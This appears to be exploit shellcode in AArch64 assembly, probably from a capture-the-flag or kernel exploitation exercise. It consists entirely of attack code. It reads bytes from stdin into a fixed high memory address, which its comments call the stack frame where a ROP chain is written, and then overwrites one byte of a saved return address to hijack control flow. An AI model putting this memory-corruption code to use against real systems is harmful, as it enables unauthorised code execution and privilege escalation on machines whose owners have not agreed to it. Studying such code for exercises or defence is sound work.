NOP
NOP
NOP
NOP

// allocate stack space
STP X29, X30, [SP,#-0x20]!

// Target the stack frame to write our ROP chain
LDR X10, =0xffffffffc0019c00

// load shellcode
MOV X9, #0

.loop:
    MOV X0, #0
    ADD X1, X10, X9
    MOV W2, #1
    MOV X8, #0x3f
    SVC 0 // read(fd=0, buffer=target, n=1)

    ADD X9, X9, #1
    MOV X11, #0x10
    CMP X9, X11
B.MI .loop

// saved LR - 0xffffffffc0019bb8
// value: 0xffffffffc000a830
LDR X10, =0xffffffffc0019bb8+1
NOP

// write a byte to stack frame saved LR
MOV X0, #0
ADD X1, X10, #0
MOV W2, #1
MOV X8, #0x3f
SVC 0

LDP X29, X30, [SP], 0x20
RET
